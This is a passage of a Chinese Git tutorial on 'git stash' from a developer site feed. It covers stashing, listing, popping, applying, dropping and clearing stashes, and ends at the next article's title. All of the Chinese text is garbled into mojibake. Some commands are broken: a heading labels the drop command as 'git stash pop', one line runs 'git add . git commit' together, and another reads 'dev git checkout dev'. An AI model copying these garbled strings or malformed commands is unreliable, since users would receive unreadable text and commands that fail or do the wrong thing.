<li>åˆ‡æ¢åˆ†æ”¯å‰ï¼ŒGit å¼ºåˆ¶è¦æ±‚ã€Œå·¥ä½œåŒºå¹²å‡€ã€ï¼Œå¦åˆ™ä¼šæç¤ºå†²çªæˆ–æ— æ³•åˆ‡æ¢ã€‚</li>
</ol>
<p>ç®€å•è¯´ï¼š<strong>æƒ³åˆ‡åˆ†æ”¯ã€ä»£ç æ²¡å†™å®Œã€ä¸æƒ³æäº¤</strong> â†’ ç”¨ <code>git stash</code> å°±å¯¹äº†ï¼</p>
<h2 data-id="heading-5">âœ… äºŒã€Git Stash åŸºç¡€æ ¸å¿ƒå‘½ä»¤ï¼ˆå¿…ä¼šï¼Œé«˜é¢‘ä½¿ç”¨ï¼‰</h2>
<p>æ‰€æœ‰å‘½ä»¤æŒ‰ã€Œä½¿ç”¨é¢‘ç‡ä»é«˜åˆ°ä½ã€æ’åºï¼Œä¼˜å…ˆæŒæ¡å‰ 5 ä¸ªå³å¯æ»¡è¶³ 90% çš„å¼€å‘éœ€æ±‚ï¼Œ<strong>æ¨èæ­»è®°ç¡¬èƒŒ + ç†Ÿç»ƒä½¿ç”¨</strong>ã€‚</p>
<p><strong>1. æ ¸å¿ƒå­˜å‚¨ï¼š<code>git stash</code> / <code>git stash push</code></strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼1ï¼šæœ€ç®€å†™æ³•ï¼ˆæ¨èï¼Œå·¥ä½œä¸­99%ç”¨è¿™ä¸ªï¼‰</span>
git stash

<span class="hljs-comment"># æ–¹å¼2ï¼šä¿å­˜ä¿®æ”¹å¹¶æ·»åŠ æè¿°ä¿¡æ¯</span>
git stash save <span class="hljs-string">"æè¿°ä¿¡æ¯"</span>

<span class="hljs-comment"># æ–¹å¼3ï¼šå®Œæ•´å†™æ³•ï¼ˆå’Œä¸Šé¢ç­‰ä»·ï¼Œpush å¯ä»¥çœç•¥ï¼‰ </span>
git stash push
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šæŠŠã€Œå·¥ä½œåŒº + æš‚å­˜åŒºã€çš„æ‰€æœ‰æœªæäº¤ä¿®æ”¹ï¼Œ<strong>ä¸´æ—¶ä¿å­˜åˆ° Git çš„ã€Œå‚¨è—æ ˆã€</strong>ï¼Œå·¥ä½œåŒºç«‹åˆ»å˜å¹²å‡€ï¼Œæ‰€æœ‰ä¿®æ”¹è¢«éšè—ã€‚</p>
<p><strong>2. å¸¦å¤‡æ³¨å­˜å‚¨ï¼š<code>git stash push -m "å¤‡æ³¨ä¿¡æ¯"</code> ã€å¼ºçƒˆæ¨èã€‘</strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash push -m <span class="hljs-string">"é¦–é¡µè½®æ’­å›¾æ ·å¼ä¿®æ”¹-æœªå®Œæˆ"</span> 

git stash push -m <span class="hljs-string">"è®¢å•æ¨¡å—bugä¿®å¤-å¾…æµ‹è¯•"</span>
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šå’Œ <code>git stash</code> åŠŸèƒ½ä¸€è‡´ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯<strong>ç»™æœ¬æ¬¡å‚¨è—æ·»åŠ ã€Œè‡ªå®šä¹‰å¤‡æ³¨ã€</strong>ã€‚</p>
<p>ğŸ‘‰ ä¸ºä»€ä¹ˆå¼ºçƒˆæ¨èï¼Ÿå½“ä½ å¤šæ¬¡ <code>git stash</code> åï¼Œä¼šæœ‰å¤šä¸ªå‚¨è—è®°å½•ï¼Œå¸¦å¤‡æ³¨èƒ½<strong>ä¸€çœ¼åŒºåˆ†æ¯ä¸ªå‚¨è—å¯¹åº”çš„ä¿®æ”¹å†…å®¹</strong>ï¼Œä¸ä¼šæ··æ·†ï¼Œé¿å…åç»­æ¢å¤é”™ä»£ç ï¼</p>
<p><strong>3. æŸ¥çœ‹æ‰€æœ‰å‚¨è—è®°å½•ï¼š<code>git stash list</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash list
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šæŸ¥çœ‹ Git å‚¨è—æ ˆä¸­<strong>æ‰€æœ‰çš„ä¸´æ—¶å­˜å‚¨è®°å½•</strong>ï¼Œè¾“å‡ºæ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-plaintext" lang="plaintext">stash@{0}: On dev: æœç´¢æ¡†æ ·å¼ä¼˜åŒ–-æœªå®Œæˆ 
stash@{1}: On dev: ç­›é€‰æ¡å•é€‰å¤±æ•ˆé—®é¢˜ä¿®å¤-å¾…æµ‹è¯• 
</code></pre>
<ul>
<li>å‚¨è—æ ˆæ˜¯ã€Œ<strong>åè¿›å…ˆå‡º</strong>ã€çš„ç»“æ„ï¼ˆæ ˆç»“æ„ï¼‰ï¼šæœ€æ–°çš„å‚¨è—è®°å½•æ’åœ¨æœ€ä¸Šé¢ï¼Œç¼–å· <code>stash@{0}</code>ï¼›</li>
<li>æ¯ä¸ªè®°å½•åŒ…å«ï¼šç¼–å·ã€æ‰€å±åˆ†æ”¯ã€è‡ªå®šä¹‰å¤‡æ³¨ã€‚</li>
</ul>
<p><strong>4. æ¢å¤å‚¨è—çš„ä¿®æ”¹ï¼š<code>git stash pop</code> ã€æœ€å¸¸ç”¨æ¢å¤æ–¹å¼ã€‘</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¢å¤ã€Œæœ€æ–°çš„å‚¨è—è®°å½•ã€(stash@{0})ï¼Œæ¢å¤åè‡ªåŠ¨åˆ é™¤è¿™æ¡å‚¨è—è®°å½• </span>
git stash pop 

<span class="hljs-comment"># æ¢å¤ã€ŒæŒ‡å®šç¼–å·ã€çš„å‚¨è—è®°å½•ï¼Œæ¢å¤åè‡ªåŠ¨åˆ é™¤è¯¥è®°å½• </span>
git stash pop stash@{1}
</code></pre>
<ul>
<li><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š<strong>å°†å‚¨è—çš„ä¿®æ”¹æ¢å¤åˆ°å½“å‰å·¥ä½œåŒº</strong>ï¼Œæ¢å¤åä»£ç å’Œä½  stash ä¹‹å‰å®Œå…¨ä¸€è‡´ï¼ˆå·¥ä½œåŒº + æš‚å­˜åŒºçš„ä¿®æ”¹éƒ½å›æ¥ï¼‰ã€‚</li>
<li><strong>å…³é”®ç‰¹æ€§</strong>ï¼š<code>pop</code> = ã€Œæ¢å¤ + åˆ é™¤ã€ï¼Œæ¢å¤åè¿™æ¡å‚¨è—è®°å½•å°±ä»æ ˆä¸­æ¶ˆå¤±äº†ï¼Œ<strong>é€‚åˆç¡®è®¤åªæ¢å¤ä¸€æ¬¡çš„åœºæ™¯</strong>ã€‚
<strong>5. æ¢å¤å‚¨è—çš„ä¿®æ”¹ï¼š<code>git stash apply</code> ã€å¤‡é€‰æ¢å¤æ–¹å¼ã€‘</strong></li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¢å¤æœ€æ–°çš„å‚¨è—è®°å½•(stash@{0})ï¼Œæ¢å¤åã€Œä¸åˆ é™¤ã€è¿™æ¡å‚¨è—è®°å½•</span>
git stash apply

<span class="hljs-comment"># æ¢å¤æŒ‡å®šç¼–å·çš„å‚¨è—è®°å½•ï¼Œæ¢å¤åã€Œä¸åˆ é™¤ã€è¯¥è®°å½•</span>
git stash apply stash@{1}
</code></pre>
<ul>
<li><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼šå’Œ <code>git stash pop</code> å‡ ä¹ä¸€æ ·ï¼Œéƒ½æ˜¯æŠŠå‚¨è—çš„ä¿®æ”¹æ¢å¤åˆ°å·¥ä½œåŒºã€‚</li>
<li><strong>å…³é”®åŒºåˆ«</strong>ï¼š<code>apply</code> = ã€Œåªæ¢å¤ï¼Œä¸åˆ é™¤ã€ï¼Œæ¢å¤åè¿™æ¡å‚¨è—è®°å½•ä¾ç„¶ä¿å­˜åœ¨æ ˆä¸­ï¼Œ<strong>é€‚åˆéœ€è¦å¤šæ¬¡æ¢å¤åŒä¸€ä»½ä¿®æ”¹çš„åœºæ™¯</strong>ã€‚</li>
</ul>
<p>âœ… <strong>é‡ç‚¹åŒºåˆ†ï¼š<code>git stash pop</code> vs <code>git stash apply</code>ï¼ˆå¿…è€ƒå¿…ç”¨ï¼‰</strong></p>
<p>è¿™ä¸¤ä¸ªå‘½ä»¤æ˜¯æœ€å®¹æ˜“æ··æ·†çš„ï¼Œè®°ä½<strong>æ ¸å¿ƒå·®å¼‚åªæœ‰ä¸€ä¸ª</strong>ï¼š<strong>æ˜¯å¦åˆ é™¤å‚¨è—è®°å½•</strong></p>
<p>âœ… <code>git stash pop</code>ï¼šæ¢å¤ + åˆ é™¤è®°å½• â†’ ã€Œä¸€æ¬¡æ€§æ¢å¤ã€ï¼Œç”¨å®Œå³åˆ ï¼Œæ¨èæ—¥å¸¸ä½¿ç”¨ï¼›</p>
<p>âœ… <code>git stash apply</code>ï¼šåªæ¢å¤ï¼Œä¸åˆ è®°å½• â†’ ã€Œå¯é‡å¤æ¢å¤ã€ï¼Œæ¢å¤åè¿˜èƒ½å†æ¬¡æ¢å¤è¿™ä»½ä¿®æ”¹ï¼Œé€‚åˆç‰¹æ®Šåœºæ™¯ã€‚</p>
<h2 data-id="heading-6">âœ… ä¸‰ã€Git Stash è¿›é˜¶å‘½ä»¤ï¼ˆå¿…ä¼šï¼Œè§£å†³ 80% çš„é—®é¢˜ï¼‰</h2>
<p><strong>1. åˆ é™¤æŒ‡å®šå‚¨è—è®°å½•ï¼š<code>git stash pop</code>å‚¨è—ç¼–å·</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤æœ€æ–°çš„å‚¨è—è®°å½•</span>
git stash drop stash@{0}

<span class="hljs-comment"># åˆ é™¤æŒ‡å®šç¼–å·çš„å‚¨è—è®°å½•</span>
git stash drop stash@{2}
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼š<strong>åªåˆ é™¤ï¼Œä¸æ¢å¤</strong>ã€‚å½“ä½ æœ‰ä¸€äº›æ— ç”¨çš„å‚¨è—è®°å½•ï¼Œä¸æƒ³æ¢å¤åªæƒ³æ¸…ç†æ—¶ï¼Œç”¨è¿™ä¸ªå‘½ä»¤ã€‚</p>
<p><strong>2.  åˆ é™¤æ‰€æœ‰å‚¨è—è®°å½•ï¼š<code>git stash clear</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash clear
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šæ¸…ç©º Git å‚¨è—æ ˆä¸­çš„<strong>æ‰€æœ‰</strong>å‚¨è—è®°å½•ï¼Œ<strong>æ…ç”¨</strong>ï¼æ‰§è¡Œåæ— æ³•æ¢å¤è¢«åˆ é™¤çš„è®°å½•ï¼Œé€‚åˆç¡®è®¤æ‰€æœ‰å‚¨è—éƒ½æ— ç”¨æ—¶çš„æ‰¹é‡æ¸…ç†ã€‚</p>
<p><strong>3. æŸ¥çœ‹å‚¨è—çš„ã€Œå…·ä½“ä¿®æ”¹å†…å®¹ã€ï¼š<code>git stash show</code></strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æœ€æ–°å‚¨è—çš„ã€Œæ–‡ä»¶å˜æ›´åˆ—è¡¨ã€ï¼ˆåªæ˜¾ç¤ºæ–‡ä»¶å+å¢åˆ è¡Œæ•°ï¼‰ </span>
git stash show

<span class="hljs-comment"># æŸ¥çœ‹æœ€æ–°å‚¨è—çš„ã€Œå®Œæ•´diffè¯¦æƒ…ã€ï¼ˆæ˜¾ç¤ºå…·ä½“ä¿®æ”¹çš„ä»£ç è¡Œï¼Œæ¨èï¼‰ </span>
git stash show -p

<span class="hljs-comment"># æŸ¥çœ‹æŒ‡å®šç¼–å·å‚¨è—çš„å®Œæ•´diffè¯¦æƒ…</span>
git stash show -p stash@{1}
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šåœ¨æ¢å¤å‚¨è—å‰ï¼Œæƒ³å…ˆçœ‹çœ‹è¿™ä»½å‚¨è—é‡Œå…·ä½“æ”¹äº†å“ªäº›ä»£ç ï¼Œé¿å…æ¢å¤é”™å†…å®¹æ—¶ï¼Œç”¨è¿™ä¸ªå‘½ä»¤ï¼Œ<code>-p</code> å‚æ•°æ˜¯æ ¸å¿ƒï¼ˆpatch è¡¥ä¸æ¨¡å¼ï¼‰ï¼Œèƒ½çœ‹åˆ°å®Œæ•´çš„ä»£ç ä¿®æ”¹ã€‚</p>
<p><strong>1. å‚¨è—ã€Œæœªè¿½è¸ªçš„æ–°æ–‡ä»¶ã€ï¼š<code>git stash -u</code> / <code>git stash --include-untracked</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash -u
<span class="hljs-comment"># ç­‰ä»·å†™æ³•</span>
git stash --include-untracked
</code></pre>
<p><strong>é‡è¦ç‰¹æ€§è¡¥å……</strong>ï¼š<strong>é»˜è®¤çš„ <code>git stash</code> åªä¼šå‚¨è—ã€Œå·²è¿½è¸ªçš„æ–‡ä»¶ã€</strong>ï¼ˆå·²ç»è¢« Git ç®¡ç†çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¹‹å‰ commit è¿‡çš„æ–‡ä»¶ï¼‰ï¼Œå¯¹äºå·¥ä½œåŒºä¸­<strong>æ–°å»ºçš„ã€ä»æœªè¢« git add è¿‡çš„æ–°æ–‡ä»¶ï¼ˆæœªè¿½è¸ªæ–‡ä»¶ï¼‰</strong> ï¼Œé»˜è®¤ä¸ä¼šè¢«å‚¨è—ã€‚</p>
<p>åŠ  <code>-u</code> å‚æ•°åï¼šä¼šæŠŠã€Œå·²è¿½è¸ªæ–‡ä»¶çš„ä¿®æ”¹ + æœªè¿½è¸ªçš„æ–°æ–‡ä»¶ã€<strong>ä¸€èµ·å‚¨è—</strong>ï¼Œå·¥ä½œåŒºå½»åº•å¹²å‡€ï¼Œè¿æ–°æ–‡ä»¶éƒ½è¢«éšè—äº†ã€‚
<strong>5. å‚¨è—ã€Œå¿½ç•¥çš„æ–‡ä»¶ã€ï¼š<code>git stash -a</code> / <code>git stash --all</code></strong></p>
<pre><code class="hljs language-bash" lang="bash">git stash -a
<span class="hljs-comment"># ç­‰ä»·å†™æ³•</span>
git stash --all
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šæœ€å¼ºçš„å‚¨è—å‘½ä»¤ï¼Œä¼šå‚¨è—ã€Œå·²è¿½è¸ªæ–‡ä»¶ä¿®æ”¹ + æœªè¿½è¸ªæ–°æ–‡ä»¶ + .gitignore ä¸­å¿½ç•¥çš„æ–‡ä»¶ã€ï¼ˆæ¯”å¦‚ node_modulesã€dist ç­‰ï¼‰ï¼Œé€‚åˆéœ€è¦å®Œå…¨æ¸…ç©ºå·¥ä½œåŒºçš„åœºæ™¯ï¼Œæ—¥å¸¸å¼€å‘å¾ˆå°‘ç”¨ï¼Œç‰¹æ®Šåœºæ™¯ï¼ˆæ¯”å¦‚åˆ‡æ¢åˆ†æ”¯å‰å½»åº•æ¸…ç†ï¼‰å¯ç”¨ã€‚</p>
<h2 data-id="heading-7">âœ… å››ã€Git Stash é¿å‘æŒ‡å— &amp; æ ¸å¿ƒæ³¨æ„äº‹é¡¹ï¼ˆé‡ä¸­ä¹‹é‡ï¼Œå¿…çœ‹ï¼ï¼‰</h2>
<p>è¿™éƒ¨åˆ†æ˜¯æœ€å®¹æ˜“è¸©å‘çš„åœ°æ–¹ï¼Œå¾ˆå¤šäººç”¨ stash å‡ºé—®é¢˜ï¼Œéƒ½æ˜¯å› ä¸ºæ²¡æ³¨æ„è¿™äº›è§„åˆ™ï¼Œ<strong>å…¨éƒ¨è®°ä½ï¼Œèƒ½é¿å¼€ 99% çš„å‘ï¼</strong></p>
<p><strong>âœ… æ³¨æ„ 1ï¼š<code>git stash</code> ä¸ä¼šå‚¨è—çš„å†…å®¹ï¼ˆé»˜è®¤è¡Œä¸ºï¼‰</strong></p>
<p>é»˜è®¤æ‰§è¡Œ <code>git stash</code> æ—¶ï¼Œä»¥ä¸‹å†…å®¹<strong>ç»å¯¹ä¸ä¼šè¢«å‚¨è—</strong>ï¼Œä¼šåŸå°ä¸åŠ¨ç•™åœ¨å·¥ä½œåŒºï¼š</p>
<ul>
<li>
<p><strong>ä»æœªè¢« Git è¿½è¸ªè¿‡çš„æ–‡ä»¶</strong>ï¼ˆæ–°å»ºçš„ã€æ²¡æ‰§è¡Œè¿‡ <code>git add</code> çš„æ–‡ä»¶ï¼‰ï¼›</p>
</li>
<li>
<p><strong>è¢« <code>.gitignore</code> å¿½ç•¥çš„æ–‡ä»¶</strong>ï¼ˆæ¯”å¦‚ä¾èµ–åŒ…ã€æ‰“åŒ…äº§ç‰©ã€æ—¥å¿—æ–‡ä»¶ï¼‰ï¼›</p>
</li>
<li>
<p><strong>å·²ç»æäº¤åˆ°ç‰ˆæœ¬åº“çš„æ–‡ä»¶</strong>ï¼ˆåªä¼šå¤„ç†ã€Œæœªæäº¤ã€çš„ä¿®æ”¹ï¼‰ã€‚</p>
</li>
</ul>
<blockquote>
<p>âœ… è§£å†³åŠæ³•ï¼šéœ€è¦å‚¨è—æœªè¿½è¸ªæ–‡ä»¶ç”¨ <code>git stash -u</code>ï¼Œéœ€è¦å‚¨è—å¿½ç•¥æ–‡ä»¶ç”¨ <code>git stash -a</code>ã€‚</p>
</blockquote>
<p><strong>âœ… æ³¨æ„ 2ï¼šstash çš„æ¢å¤ä¸ã€Œåˆ†æ”¯æ— å…³ã€ï¼Œä½†æœ‰æœ€ä½³å®è·µ</strong></p>
<p>å¾ˆå¤šäººè¯¯ä»¥ä¸ºã€Œåœ¨å“ªä¸ªåˆ†æ”¯ stashï¼Œå°±åªèƒ½åœ¨å“ªä¸ªåˆ†æ”¯æ¢å¤ã€ï¼Œ<strong>è¿™ä¸ªè®¤çŸ¥æ˜¯é”™è¯¯çš„ï¼</strong></p>
<p><strong>çœŸç›¸</strong>ï¼šGit çš„ stash æ˜¯ã€Œå…¨å±€çš„ã€ï¼Œå‚¨è—çš„æ˜¯ã€Œæ–‡ä»¶çš„ä¿®æ”¹å†…å®¹ã€ï¼Œä¸æ˜¯å’Œåˆ†æ”¯ç»‘å®šçš„ï¼Œä½ å¯ä»¥åœ¨ <code>dev</code> åˆ†æ”¯ stashï¼Œç„¶ååˆ‡æ¢åˆ° <code>test</code> åˆ†æ”¯æ¢å¤ã€‚</p>
<p>æœ€ä½³å®è·µï¼š<strong>å°½é‡åœ¨å“ªä¸ªåˆ†æ”¯å‚¨è—ï¼Œå°±åœ¨å“ªä¸ªåˆ†æ”¯æ¢å¤</strong>ï¼</p>
<blockquote>
<p>åŸå› ï¼šä¸åŒåˆ†æ”¯çš„ä»£ç å·®å¼‚å¯èƒ½å¾ˆå¤§ï¼Œè·¨åˆ†æ”¯æ¢å¤ stash å¤§æ¦‚ç‡ä¼šè§¦å‘ã€Œä»£ç å†²çªã€ï¼Œå¤„ç†å†²çªä¼šå¢åŠ ä¸å¿…è¦çš„éº»çƒ¦ï¼Œé™¤éä½ æ˜ç¡®çŸ¥é“ä¸¤ä»½ä»£ç æ— å†²çªã€‚</p>
</blockquote>
<p><strong>âœ… æ³¨æ„ 3ï¼šå‚¨è—è®°å½•çš„ã€Œç”Ÿå‘½å‘¨æœŸã€</strong></p>
<p>å‚¨è—è®°å½•ä¸æ˜¯æ°¸ä¹…ä¿å­˜çš„ï¼Œå®ƒæ˜¯ã€Œä¸´æ—¶ç¼“å­˜ã€ï¼Œä»¥ä¸‹æ“ä½œä¼šåˆ é™¤å‚¨è—è®°å½•ï¼š</p>
<ul>
<li>æ‰§è¡Œ <code>git stash pop ç¼–å·</code>ï¼šæ¢å¤åè‡ªåŠ¨åˆ é™¤è¯¥è®°å½•ï¼›</li>
<li>æ‰§è¡Œ <code>git stash drop ç¼–å·</code>ï¼šæ‰‹åŠ¨åˆ é™¤è¯¥è®°å½•ï¼›</li>
<li>æ‰§è¡Œ <code>git stash clear</code>ï¼šåˆ é™¤æ‰€æœ‰è®°å½•ï¼›</li>
<li>ä»“åº“è¢«åˆ é™¤ / è¿ç§»ï¼šå‚¨è—è®°å½•ä¼šè·Ÿç€ä»“åº“æ¶ˆå¤±ï¼ˆä¸ä¼šåŒæ­¥åˆ°è¿œç¨‹ä»“åº“ï¼‰ã€‚</li>
</ul>
<p><strong>âœ… æ³¨æ„ 4ï¼šstash æ— æ³•å‚¨è—ã€Œç©ºæ–‡ä»¶ / ç©ºç›®å½•ã€</strong></p>
<p>å¦‚æœä½ çš„ä¿®æ”¹åªæ˜¯æ–°å»ºäº†ä¸€ä¸ªç©ºæ–‡ä»¶ / ç©ºç›®å½•ï¼Œæ‰§è¡Œ <code>git stash</code> ä¸ä¼šç”Ÿæ•ˆï¼ŒGit ä¼šæç¤ºã€ŒNo local changes to saveã€ï¼Œè¿™æ˜¯ Git çš„é»˜è®¤è§„åˆ™ï¼Œæ— éœ€å¤„ç†ã€‚</p>
<p><strong>âœ… äº”ã€Git Stash å®Œæ•´å·¥ä½œæµç¨‹æ¼”ç¤ºï¼ˆå·¥ä½œä¸­æœ€å¸¸ç”¨ï¼Œç›´æ¥å¥—ç”¨ï¼‰</strong></p>
<p>ç»™ä½ ä¸€å¥—å®Œæ•´çš„ã€Œæ ‡å‡†æµç¨‹ã€ï¼Œé‡åˆ°ã€Œä»£ç æ²¡å†™å®Œè¦åˆ‡åˆ†æ”¯ã€çš„åœºæ™¯ï¼Œç›´æ¥æŒ‰æ­¥éª¤æ‰§è¡Œå³å¯ï¼Œé›¶é”™è¯¯ã€é›¶è¸©å‘ï¼Œè¿™æ˜¯å·¥ä½œä¸­æœ€ç»å…¸çš„ç”¨æ³•ï¼š</p>
<h3 data-id="heading-8">åœºæ™¯ï¼šåœ¨ dev åˆ†æ”¯å¼€å‘æ–°åŠŸèƒ½ï¼Œå†™åˆ°ä¸€åŠï¼Œéœ€è¦åˆ‡æ¢åˆ° test åˆ†æ”¯ä¿®ç´§æ€¥ Bug</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ­¥éª¤1ï¼šå½“å‰åœ¨ dev åˆ†æ”¯ï¼Œä»£ç æ²¡å†™å®Œï¼Œå¸¦å¤‡æ³¨å‚¨è—æ‰€æœ‰ä¿®æ”¹ï¼ˆæ¨èå¸¦-mï¼‰</span>
git stash push -m <span class="hljs-string">"dev-ä¸ªäººä¸­å¿ƒæ¨¡å—å¼€å‘-æœªå®Œæˆ"</span>

<span class="hljs-comment"># æ­¥éª¤2ï¼šæŸ¥çœ‹å‚¨è—è®°å½•ï¼Œç¡®è®¤å‚¨è—æˆåŠŸï¼ˆå¯é€‰ï¼Œå…»æˆå¥½ä¹ æƒ¯ï¼‰</span>
git stash list

<span class="hljs-comment"># æ­¥éª¤3ï¼šåˆ‡æ¢åˆ°ç›®æ ‡åˆ†æ”¯ï¼ˆæ­¤æ—¶å·¥ä½œåŒºå¹²å‡€ï¼Œåˆ‡æ¢æ— ä»»ä½•é—®é¢˜ï¼‰</span>
git checkout <span class="hljs-built_in">test</span>

<span class="hljs-comment"># æ­¥éª¤4ï¼šåœ¨ test åˆ†æ”¯ä¿®å¤ Bugï¼Œå®Œæˆåæ­£å¸¸æäº¤</span>
git add . git commit -m <span class="hljs-string">"test-ä¿®å¤è®¢å•æ”¯ä»˜å¤±è´¥bug"</span>

<span class="hljs-comment"># æ­¥éª¤5ï¼šåˆ‡å›åŸåˆ†æ”¯</span>
dev git checkout dev

<span class="hljs-comment"># æ­¥éª¤6ï¼šæ¢å¤ä¹‹å‰å‚¨è—çš„æœªå®Œæˆä»£ç ï¼ˆæ¨èç”¨popï¼Œæ¢å¤ååˆ é™¤è®°å½•ï¼‰</span>
git stash pop

<span class="hljs-comment"># æ­¥éª¤7ï¼šç»§ç»­å¼€å‘æœªå®Œæˆçš„åŠŸèƒ½å³å¯ï¼Œä»£ç å’Œä¹‹å‰å®Œå…¨ä¸€è‡´ âœ”ï¸</span>
</code></pre>
<h2 data-id="heading-9"><strong>âœ… æ ¸å¿ƒçŸ¥è¯†ç‚¹é€Ÿè®°</strong></h2>
<h3 data-id="heading-10">âœ… æ ¸å¿ƒæ¦‚å¿µ</h3>
<ol>
<li>git stashï¼šä¸´æ—¶ä¿å­˜æœªæäº¤ä¿®æ”¹ï¼Œè®©å·¥ä½œåŒºå˜å¹²å‡€ï¼Œæ ¸å¿ƒåœºæ™¯ã€Œä»£ç æ²¡å†™å®Œè¦åˆ‡åˆ†æ”¯ã€ï¼›</li>
<li>stash æ˜¯ã€Œæ ˆç»“æ„ã€ï¼Œåè¿›å…ˆå‡ºï¼Œæœ€æ–°çš„è®°å½•æ˜¯ stash@{0}ã€‚</li>
</ol>
<h3 data-id="heading-11">âœ… å¿…ä¼šæ ¸å¿ƒå‘½ä»¤ï¼ˆæŒ‰ä¼˜å…ˆçº§æ’åºï¼‰</h3>
<ol>
<li>å‚¨è—ï¼š<code>git stash push -m "å¤‡æ³¨"</code> ï¼ˆå¸¦å¤‡æ³¨ï¼Œæ¨èé¦–é€‰ï¼‰</li>
<li>æŸ¥çœ‹ï¼š<code>git stash list</code></li>
<li>æ¢å¤ï¼š<code>git stash pop</code> ï¼ˆæ¢å¤ + åˆ é™¤ï¼Œæ—¥å¸¸é¦–é€‰ï¼‰ / <code>git stash apply</code>ï¼ˆæ¢å¤ä¸åˆ é™¤ï¼Œå¤‡é€‰ï¼‰</li>
<li>åˆ é™¤ï¼š<code>git stash drop ç¼–å·</code>ï¼ˆåˆ æŒ‡å®šï¼‰ / <code>git stash clear</code>ï¼ˆåˆ å…¨éƒ¨ï¼‰</li>
<li>æŸ¥çœ‹ä¿®æ”¹ï¼š<code>git stash show -p</code></li>
</ol>
<h3 data-id="heading-12">âœ… ä¸¤å¤§é¿å‘é‡ç‚¹</h3>
<ol>
<li>é»˜è®¤ä¸å‚¨è—ã€Œæœªè¿½è¸ªæ–‡ä»¶ã€å’Œã€Œå¿½ç•¥æ–‡ä»¶ã€ï¼Œéœ€è¦åˆ™åŠ  <code>-u</code> / <code>-a</code>ï¼›</li>
<li>å°½é‡ã€ŒåŒåˆ†æ”¯å‚¨è—ã€åŒåˆ†æ”¯æ¢å¤ã€ï¼Œé¿å…è·¨åˆ†æ”¯å†²çªã€‚</li>
</ol>
<h3 data-id="heading-13">âœ… æ ¸å¿ƒåŒºåˆ«é€Ÿè®°</h3>
<p><code>git stash pop</code> â†’ æ¢å¤ + åˆ è®°å½•ï¼›<code>git stash apply</code> â†’ æ¢å¤ä¸åˆ è®°å½•ã€‚</p>
<h5 data-id="heading-14"><strong>å°å‰§åœº</strong>åˆ†äº«å‡ ä¸ªå¥½çœ‹çš„MDä¸»é¢˜</h5>
<ul>
<li><strong>qklhk-chocolate</strong></li>
<li>scrolls-light</li>
<li>Chinese-red</li>
<li>nico</li>
<li>devui-blue</li>
<li>z-blue</li>
<li>yu</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ ˆä¸é˜Ÿåˆ—ï¼šåŠ›æ‰£â€œåŒèƒèƒâ€çš„ç›¸çˆ±ç›¸æ€ï¼Œä»æ‹¬å·é…å¯¹åˆ°æ»‘çª—æœ€å¤§å€¼ï¼]]></title>    <link>https://juejin.cn/post/7602503154505302057</link>    <guid>https://juejin.cn/post/7602503154505302057</guid>    <pubDate>2026-02-03T13:46:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154505302057" data-draft-id="7602497125267701766" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ ˆä¸é˜Ÿåˆ—ï¼šåŠ›æ‰£â€œåŒèƒèƒâ€çš„ç›¸çˆ±ç›¸æ€ï¼Œä»æ‹¬å·é…å¯¹åˆ°æ»‘çª—æœ€å¤§å€¼ï¼"/> <meta itemprop="keywords" content="JavaScript,ç®—æ³•,LeetCode"/> <meta itemprop="datePublished" content="2026-02-03T13:46:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”Ÿæ¤°ä¸ç»’æ‹¿é“"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ ˆä¸é˜Ÿåˆ—ï¼šåŠ›æ‰£â€œåŒèƒèƒâ€çš„ç›¸çˆ±ç›¸æ€ï¼Œä»æ‹¬å·é…å¯¹åˆ°æ»‘çª—æœ€å¤§å€¼ï¼
